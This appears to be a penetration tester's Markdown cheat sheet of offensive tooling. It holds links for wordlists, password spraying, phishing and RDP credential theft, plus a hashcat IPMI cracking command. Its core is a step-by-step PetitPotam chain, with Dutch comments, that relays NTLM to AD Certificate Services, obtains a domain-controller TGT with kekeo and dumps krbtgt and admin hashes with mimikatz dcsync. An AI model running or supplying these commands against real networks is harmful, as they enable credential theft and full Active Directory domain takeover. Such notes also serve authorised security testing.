# Notes
~

<br /><br />

# Enumeration
## Wordlists

https://wordlists.assetnote.io \
https://github.com/danielmiessler/SecLists \
https://github.com/xajkep/wordlists \
\


# Citrix 

## Gateway
https://github.com/Smarttech247PT/citrix_fgateway_fingerprint


 
 
 <br /><br />


# Passwords



## Password Cracking

Cracking IPMI 
```
./hashcat -m 7300 ~/Desktop/hashes ~/Desktop/Lists/passwords.txt --username
```
Wordlists: \
https://github.com/ohmybahgosh/RockYou2021.txt \
https://raw.githubusercontent.com/OpenTaal/opentaal-wordlist/master/wordlist.txt \
https://github.com/OpenTaal/opentaal-wordlist


Resources and tools: \
https://github.com/JakeWnuk/HIBPv7-Resources \
https://github.com/glitchedgitz/cook 

Rules:\
https://github.com/rarecoil/pantagrule <br/>



## Password Spraying / Login 

https://github.com/knavesec/CredMaster \
https://github.com/blacklanternsecurity/TREVORspray \
https://github.com/byt3bl33d3r/SprayingToolkit \
https://github.com/dafthack/DomainPasswordSpray \  
https://github.com/dafthack/MailSniper 
<br /><br />
 
# Phishing 
https://github.com/tokyoneon/CredPhish





<br /><br />


# Internal attacks


## RDP Attacks

https://github.com/0x09AL/RdpThief

## Petite Potam
PetitPotam
```
1. Gebruik crackmapexec (of een andere tool/script) om de Active Directory Certificate Services systemen op te vragen.
(Nieuwste versie van cme is benodigd om ldap module te kunnen gebruiken, bijvoorbeeld 5.2.3)
cme ldap 'domaincontroller' -d 'domain' -u 'user' -p 'password' -M adcs 

2. Zet de relay aanval op richting de Certificate Authority server:
impacket-ntlmrelayx -debug -smb2support --adcs -t https://<CA SERVER>/certsrv/certfnsh.asp --template DomainController

Trigger de NTLM authenticatie zodat de reflectie verstuurd kan worden middels PetitPotam.py (topotam):
3. python3 PetitPotam.py <responder IP> <domain> -u 'username' -p 'password'
  
Als de aanval succesvol verloopt beschik je nu over het CA certificaat in base64 vorm.

4. Start 'kekeo.exe' (gentlwiki), schakel Base64 input in en vraag een TGT (Ticket Granting Ticket) aan middels het eerder bemachtigde certificaat (PBX)
a. kekeo # base64 /input:on
b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<domain> /ptt

5. Start mimikatz (gentlwiki) om een dcsync uit te voeren en de NTLM hash van iedere gewenste user te dumpen:
1. lsadump::dcsync /domain:<domain> /user:krbtgt
2. lsadump::dcsync /domain:<domain> /user:dcadmin```
 <br/>
  
 # Physical attacks
  
  
 ## BIOS
 https://github.com/skysafe/reblog/blob/main/0000-defeating-a-laptops-bios-password/README.md

